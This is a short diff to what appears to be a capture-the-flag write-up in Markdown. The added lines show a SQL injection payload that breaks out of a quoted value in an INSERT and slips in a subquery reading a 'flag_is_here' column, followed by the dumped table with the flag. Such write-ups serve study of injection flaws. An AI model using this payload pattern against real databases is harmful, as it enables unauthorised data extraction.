@@ -1071,3 +1071,12 @@ insert into article(title,author,description,content,dateline) values('114514' a
 ```
 ![[Pasted image 20240329125514.png]]
 dump
+```
+10086',(select flag_is_here from hazel.hazel where id=2),'10086','10086','1919810')#
+```
+
+| id  | flag_is_here                                |
+| --- | ------------------------------------------- |
+| 1   | shuaige                                     |
+| 2   | hazel{863184db-8501-49b4-a8c9-96bc10101c72} |
+
